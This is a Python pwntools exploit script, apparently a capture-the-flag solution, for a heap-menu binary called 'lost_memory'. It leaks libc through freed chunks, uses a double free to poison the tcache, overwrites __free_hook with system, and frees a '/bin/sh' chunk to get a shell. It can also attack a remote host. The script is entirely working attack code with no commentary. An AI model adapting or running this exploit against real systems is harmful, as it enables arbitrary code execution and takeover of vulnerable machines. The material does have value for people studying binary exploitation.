#!/usr/bin/env python3

from pwn import *

exe = ELF("./lost_memory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'
gs = '''
set max-visualize-chunk-size 100
'''

def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], int(sys.argv[2]))

    return p

p = init()

def allocate(size):
    p.sendlineafter(b"choice:\n", str(1))
    p.sendlineafter(b"like?\n", str(size))

def write(content, get = 0): # < 0x100
    p.sendlineafter(b"choice:\n", str(2))
    p.sendlineafter(b"write?\n", content)
    if get:
        p.recvuntil(b"ptr[memIndex] = " + content + b"\n")
        return u64(p.recvline()[:-1].ljust(8, b"\00"))
    return None

def free():
    p.sendlineafter(b"choice:\n", str(4))

def select(idx):
    p.sendlineafter(b"choice:\n", str(3))
    p.sendlineafter(b"(0 - 9)\n", str(idx))

# leak libc:
for i in range(9):
    select(i)
    allocate(0x88)  

for i in range(8):
    select(i)
    free()

select(7)
allocate(0x8)
leak_libc = write(b"A"*7, 1)
libc_base = leak_libc - (libc.sym.main_arena + 224)
system = libc_base + libc.sym.system
__free_hook = libc_base + libc.sym.__free_hook
log.info(f"libc base: {hex(libc_base)}")

# overwrite got:
# double free
select(0)
allocate(0x18)
select(1)
allocate(0x18)
select(1)
free()
select(0)
free()

write(p64(__free_hook))
allocate(0x18)
write(b"/bin/sh\00")
select(1)
allocate(0x18)
write(p64(system))
select(0)
free()






p.interactive()
